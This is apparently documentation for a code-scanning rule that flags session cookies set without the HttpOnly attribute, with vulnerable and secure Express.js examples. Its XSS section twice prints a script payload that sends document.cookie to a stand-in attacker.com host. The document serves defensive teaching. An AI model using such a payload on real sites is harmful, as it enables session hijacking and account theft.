# S032 - Set HttpOnly attribute for Session Cookies

## Rule Description

**S032** ensures that session cookies have the `HttpOnly` attribute set to prevent JavaScript access. This protects against XSS attacks by preventing client-side script access to sensitive cookies, reducing the risk of cookie theft.

## Security Impact

- **High**: Session cookies without HttpOnly can be accessed via JavaScript in XSS attacks
- **Attack Vector**: Cross-Site Scripting (XSS), malicious scripts
- **Compliance**: OWASP Top 10, security best practices

## Detection Patterns

### Vulnerable Code Examples

```javascript
// ❌ Express.js - Missing HttpOnly attribute
res.cookie("sessionid", sessionValue, {
  secure: true,
  // Missing: httpOnly: true
});

// ❌ Set-Cookie header - No HttpOnly attribute
res.setHeader("Set-Cookie", "sessionid=abc123; Secure");

// ❌ Document.cookie - Accessible by JavaScript
document.cookie = "auth=token123; path=/; Secure";

// ❌ Session middleware - Missing HttpOnly
app.use(
  session({
    secret: "secret-key",
    name: "sessionid",
    cookie: {
      secure: true,
      // Missing: httpOnly: true
    },
  })
);

// ❌ Explicitly disabled HttpOnly
res.cookie("jwt", tokenValue, {
  secure: true,
  httpOnly: false, // Explicitly vulnerable
});
```

### Secure Code Examples

```javascript
// ✅ Express.js - With HttpOnly attribute
res.cookie("sessionid", sessionValue, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
});

// ✅ Set-Cookie header - With HttpOnly attribute
res.setHeader("Set-Cookie", "sessionid=abc123; HttpOnly; Secure");

// ✅ Session middleware - Secure configuration
app.use(
  session({
    secret: "secret-key",
    name: "sessionid",
    cookie: {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
    },
  })
);

// ✅ Complete security configuration
res.cookie("auth", authToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict",
  maxAge: 3600000, // 1 hour
});
```

## Session Cookie Indicators

The rule detects cookies that are likely session-related based on:

- **Cookie Names**: `session`, `sessionid`, `sessid`, `jsessionid`, `phpsessid`
- **Framework Patterns**: `connect.sid`, `asp.net_sessionid`
- **Authentication**: `auth`, `token`, `jwt`, `csrf`, `refresh`

## Supported Frameworks

- **Express.js**: `res.cookie()`, `res.setHeader()`
- **Koa**: Cookie setting methods
- **Fastify**: Cookie plugins
- **Next.js**: API routes cookie handling
- **Native**: `document.cookie`, Set-Cookie headers

## Configuration

The rule can be configured in `config.json`:

```json
{
  "validation": {
    "sessionIndicators": ["session", "sessionid", "auth", "token", "refresh"],
    "cookieMethods": ["setCookie", "cookie", "setHeader"],
    "httpOnlyPatterns": ["httpOnly:\\s*true", "HttpOnly"]
  }
}
```

## HttpOnly vs XSS Protection

### Without HttpOnly (Vulnerable)

```javascript
// JavaScript can access this cookie
document.cookie; // "sessionid=abc123; auth=token456"

// XSS payload can steal cookies
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>;
```

### With HttpOnly (Protected)

```javascript
// JavaScript cannot access HttpOnly cookies
document.cookie; // Only shows non-HttpOnly cookies

// XSS attacks cannot steal session cookies
<script>
  // This will not include HttpOnly cookies
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>;
```

## Best Practices

1. **Always use HttpOnly for session cookies**
2. **Combine with Secure flag** for HTTPS-only transmission
3. **Use SameSite attribute** for CSRF protection
4. **Complete security configuration**:
   ```javascript
   res.cookie("session", value, {
     httpOnly: true, // Prevent JavaScript access
     secure: true, // HTTPS only
     sameSite: "strict", // CSRF protection
     maxAge: 3600000, // Expiration
   });
   ```

## Exception Cases

Some legitimate use cases may require JavaScript access:

```javascript
// ✅ Non-session cookies for UI preferences
res.cookie("theme", "dark", {
  // httpOnly: false is acceptable here
  secure: true,
  sameSite: "lax",
});

// ✅ CSRF tokens that need JavaScript access
res.cookie("csrf-token", csrfToken, {
  // httpOnly: false for AJAX requests
  secure: true,
  sameSite: "strict",
});
```

## Related Rules

- **S031**: Secure flag for cookies
- **S033**: SameSite attribute for CSRF protection
- **S034**: Cookie expiration and domain settings

## References

- [OWASP Session Management](https://owasp.org/www-project-cheat-sheets/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN HttpOnly Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [OWASP XSS Prevention](https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
